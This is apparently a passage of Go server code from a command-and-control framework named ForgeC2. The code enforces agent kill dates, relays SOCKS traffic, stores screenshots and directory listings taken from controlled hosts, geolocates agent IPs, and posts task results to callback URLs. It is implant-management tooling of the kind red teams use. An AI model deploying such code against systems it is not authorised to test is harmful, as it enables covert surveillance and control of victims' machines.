	// Kill date enforcement: if the agent's kill date has passed and no kill task is pending,
	// inject a kill task so the agent self-destructs on next execution.
	if agent.KillDate != nil && now.After(*agent.KillDate) {
		hasKillTask := false
		for _, t := range resp.Tasks {
			if t.Type == "kill" {
				hasKillTask = true
				break
			}
		}
		if !hasKillTask {
			killTask, err := s.createTask(req.UUID, "kill", "", "", "", "", 0, 0)
			if err == nil {
				killTask.Status = "running"
				if err := s.db.Save(killTask).Error; err == nil {
					resp.Tasks = append(resp.Tasks, task{
						ID:   killTask.ID,
						Type: killTask.Type,
					})
				}
			}
		}
	}

	s.processSOCKSRelay(req.UUID, req.SocksData, &resp)

	return resp
}

func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data string) {
	if s.IsScreenMonitoring(agentID) {
		return // do not retain files during live screen monitoring
	}
	if dataDir == "" {
		dataDir = "data"
	}
	dir := filepath.Join(dataDir, "screenshots", agentID)
	if err := os.MkdirAll(dir, 0700); err != nil {
		slog.Error("Failed to create screenshots dir", "agent", agentID, "error", err)
	}
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return
	}
	filename := fmt.Sprintf("screenshot_%d_%d.png", taskID, time.Now().Unix())
	if err := os.WriteFile(filepath.Join(dir, filename), data, 0600); err != nil {
		slog.Error("failed to save screenshot", "file", filename, "error", err)
	}
}

func (s *Server) handleServeScreenshot(c *gin.Context) {
	agentID := c.Param("agent_id")
	filename := c.Param("filename")

	// Build absolute path to the screenshot root directory
	screenshotRoot := filepath.Clean(filepath.Join(s.cfg.Server.DataDir, "screenshots"))

	// Use filepath.Clean to eliminate path traversal sequences (../, ./)
	requested := filepath.Clean(filepath.Join(screenshotRoot, agentID, filename))

	// Verify the final path is under the root directory to prevent path traversal escape
	if !strings.HasPrefix(requested, screenshotRoot+string(filepath.Separator)) {
		c.String(http.StatusBadRequest, "invalid path")
		return
	}

	c.File(requested)
}

// safeJoin verifies that joining base+name stays within base, preventing path traversal.
// Returns empty string if the path escapes the base directory.
func safeJoin(base, name string) string {
	cleanBase := filepath.Clean(base)
	target := filepath.Clean(filepath.Join(cleanBase, name))
	if !strings.HasPrefix(target, cleanBase+string(filepath.Separator)) && target != cleanBase {
		return ""
	}
	return target
}

// lookupGeoIP queries ip-api.com for geolocation data
func (s *Server) lookupGeoIP(ip string) (country, city string, lat, lon float64) {
	if ip == "" || ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") || strings.HasPrefix(ip, "10.") || strings.HasPrefix(ip, "172.") {
		return "", "", 0, 0
	}
	url := "https://ip-api.com/json/" + ip + "?fields=country,city,lat,lon"
	client := &http.Client{Timeout: GeoIPLookupTimeout}
	resp, err := client.Get(url)
	if err != nil {
		return "", "", 0, 0
	}
	defer resp.Body.Close()
	var result struct {
		Country string  `json:"country"`
		City    string  `json:"city"`
		Lat     float64 `json:"lat"`
		Lon     float64 `json:"lon"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", "", 0, 0
	}
	return result.Country, result.City, result.Lat, result.Lon
}

// normalizeLsResult converts a tab-separated "dir /s" style listing
// into a JSON array.  Returns the original string unchanged when there
// are no data lines (header/separator only).
func normalizeLsResult(raw string) string {
	lines := strings.Split(raw, "\n")

	type lsEntry struct {
		Name    string `json:"name"`
		IsDir   bool   `json:"is_dir"`
		Size    int64  `json:"size"`
		ModTime string `json:"mod_time"`
	}

	var entries []lsEntry
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "Type") || strings.HasPrefix(line, "---") || strings.HasPrefix(line, "─") {
			continue
		}
		parts := strings.SplitN(line, "\t", 4)
		if len(parts) < 4 {
			continue
		}
		isDir := strings.EqualFold(parts[0], "DIR")
		size, _ := strconv.ParseInt(parts[2], 10, 64)
		entries = append(entries, lsEntry{
			Name:    parts[1],
			IsDir:   isDir,
			Size:    size,
			ModTime: parts[3],
		})
	}

	if len(entries) == 0 {
		return raw
	}
	b, _ := json.Marshal(entries)
	return string(b)
}

// executeTaskCallback POSTs task completion results to the configured callback URL.
func (s *Server) executeTaskCallback(task db.Task, agentID string) {
	payload := map[string]interface{}{
		"task_id":   task.ID,
		"agent_id":  agentID,
		"type":      task.Type,
		"command":   task.Command,
		"status":    task.Status,
		"result":    task.Result,
		"error":     task.Error,
		"completed": task.UpdatedAt.Format(time.RFC3339),
	}
	body, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal callback payload", "task_id", task.ID, "error", err)
		return
	}

	method := strings.ToUpper(task.CallbackMethod)
	if method == "" {
		method = "POST"
	}

	req, err := http.NewRequest(method, task.CallbackURL, strings.NewReader(string(body)))
	if err != nil {
		slog.Error("Failed to create callback request", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "ForgeC2-Callback/1.0")

	client := &http.Client{Timeout: CallbackHTTPTimeout}
	resp, err := client.Do(req)
	if err != nil {
		slog.Error("Callback request failed", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		s.db.Model(&task).Update("callback_sent", true)
		slog.Info("Task callback delivered", "task_id", task.ID, "url", task.CallbackURL, "status", resp.StatusCode)
	} else {
		slog.Warn("Task callback returned non-2xx", "task_id", task.ID, "url", task.CallbackURL, "status", resp.StatusCode)
	}
}
